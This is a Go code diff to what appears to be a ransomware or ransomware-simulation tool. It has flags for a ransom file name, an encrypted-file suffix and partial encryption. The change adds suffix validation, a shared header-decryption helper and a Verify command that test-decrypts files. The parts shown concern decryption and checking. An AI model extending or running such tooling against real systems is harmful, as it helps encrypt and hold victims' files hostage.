@@ -66,6 +66,13 @@ func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
 	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
 }
 
+func validateEncSuffix(s string) error {
+	if !strings.HasPrefix(s, ".") {
+		return fmt.Errorf("--encSuffix must start with '.', got %q", s)
+	}
+	return nil
+}
+
 // fileSize returns the size of the file at path, or 0 if it cannot be determined.
 func fileSize(path string) int64 {
 	info, err := os.Stat(path)
@@ -133,6 +140,10 @@ func Encrypt(ctx *urfavecli.Context) error {
 	encSuffix := ctx.String("encSuffix")
 	partial := ctx.Int64("partial")
 	reportPath := ctx.String("report")
+
+	if err := validateEncSuffix(encSuffix); err != nil {
+		return err
+	}
 
 	if partial < 0 {
 		return errors.New("--partial must be a non-negative number of bytes")
@@ -217,6 +228,11 @@ func Decrypt(ctx *urfavecli.Context) error {
 	encSuffix := ctx.String("encSuffix")
 	ransomFileName := ctx.String("ransomFileName")
 	reportPath := ctx.String("report")
+
+	if err := validateEncSuffix(encSuffix); err != nil {
+		return err
+	}
+
 	extWhitelist := []string{encSuffix}
 
 	absolutePath, err := filepath.Abs(path)
@@ -361,6 +377,38 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 	return nil
 }
 
+// readEncryptedHeader reads and validates the file header and decrypts the AES
+// key from an opened encrypted file. The caller's src reader is advanced past
+// the header and encrypted key, ready to read encrypted content.
+func readEncryptedHeader(src io.Reader, rsaPrivateKey *rsa.PrivateKey) (fileHeader, crypto.AesKey, error) {
+	var hdr fileHeader
+	if err := hdr.readFrom(src); err != nil {
+		return hdr, nil, fmt.Errorf("read file header: %w", err)
+	}
+
+	if !validKeySizes[int(hdr.KeySizeBits)] {
+		return hdr, nil, fmt.Errorf("invalid key size in file header: %d bits", hdr.KeySizeBits)
+	}
+
+	keySizeBytes := int(hdr.KeySizeBits) / 8
+	if keySizeBytes != rsaPrivateKey.Size() {
+		return hdr, nil, fmt.Errorf("key size mismatch: file encrypted with %d-bit key, but private key is %d-bit",
+			hdr.KeySizeBits, rsaPrivateKey.Size()*8)
+	}
+
+	encryptedKey := make([]byte, keySizeBytes)
+	if _, err := io.ReadFull(src, encryptedKey); err != nil {
+		return hdr, nil, fmt.Errorf("read encrypted key: %w", err)
+	}
+
+	aesKey, err := crypto.RsaDecrypt(encryptedKey, rsaPrivateKey)
+	if err != nil {
+		return hdr, nil, err
+	}
+
+	return hdr, aesKey, nil
+}
+
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (retErr error) {
 	src, err := os.Open(path)
 	if err != nil {
@@ -368,27 +416,7 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 	}
 	defer func() { _ = src.Close() }()
 
-	var hdr fileHeader
-	if err := hdr.readFrom(src); err != nil {
-		return fmt.Errorf("read file header: %w", err)
-	}
-
-	if !validKeySizes[int(hdr.KeySizeBits)] {
-		return fmt.Errorf("invalid key size in file header: %d bits", hdr.KeySizeBits)
-	}
-
-	keySizeBytes := int(hdr.KeySizeBits) / 8
-	if keySizeBytes != rsaPrivateKey.Size() {
-		return fmt.Errorf("key size mismatch: file encrypted with %d-bit key, but private key is %d-bit",
-			hdr.KeySizeBits, rsaPrivateKey.Size()*8)
-	}
-
-	encryptedKey := make([]byte, keySizeBytes)
-	if _, err := io.ReadFull(src, encryptedKey); err != nil {
-		return fmt.Errorf("read encrypted key: %w", err)
-	}
-
-	aesKey, err := crypto.RsaDecrypt(encryptedKey, rsaPrivateKey)
+	hdr, aesKey, err := readEncryptedHeader(src, rsaPrivateKey)
 	if err != nil {
 		return err
 	}
@@ -427,6 +455,66 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 	// Restore original modification time.
 	modTime := time.Unix(hdr.ModTime, 0)
 	return os.Chtimes(outPath, modTime, modTime)
+}
+
+// Verify checks that encrypted files can be successfully decrypted without writing output.
+func Verify(ctx *urfavecli.Context) error {
+	path := ctx.String("path")
+	privateKeyPath := ctx.String("privateKey")
+	skipHidden := ctx.Bool("skipHidden")
+	recursive := ctx.Bool("recursive")
+	workers := ctx.Int("workers")
+	encSuffix := ctx.String("encSuffix")
+	reportPath := ctx.String("report")
+
+	if err := validateEncSuffix(encSuffix); err != nil {
+		return err
+	}
+
+	extWhitelist := []string{encSuffix}
+
+	absolutePath, err := filepath.Abs(path)
+	if err != nil {
+		return err
+	}
+
+	rsaPrivateKey, err := loadPrivateKey(privateKeyPath)
+	if err != nil {
+		return err
+	}
+	slog.Info("RSA private key loaded")
+
+	slog.Info("Starting verification",
+		"path", absolutePath,
+		"workers", workers,
+		"recursive", recursive,
+		"encSuffix", encSuffix,
+	)
+
+	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
+	if err != nil {
+		return err
+	}
+
+	return processFiles(files, workers, true, "Verifying", reportPath, func(filePath string) error {
+		return verifyFile(filePath, rsaPrivateKey)
+	})
+}
+
+// verifyFile decrypts an encrypted file to io.Discard to confirm validity.
+func verifyFile(path string, rsaPrivateKey *rsa.PrivateKey) error {
+	src, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer func() { _ = src.Close() }()
+
+	_, aesKey, err := readEncryptedHeader(src, rsaPrivateKey)
+	if err != nil {
+		return err
+	}
+
+	return crypto.AesDecryptStream(src, io.Discard, aesKey)
 }
 
 // splitCommaSeparated splits a comma-separated string into a trimmed slice,
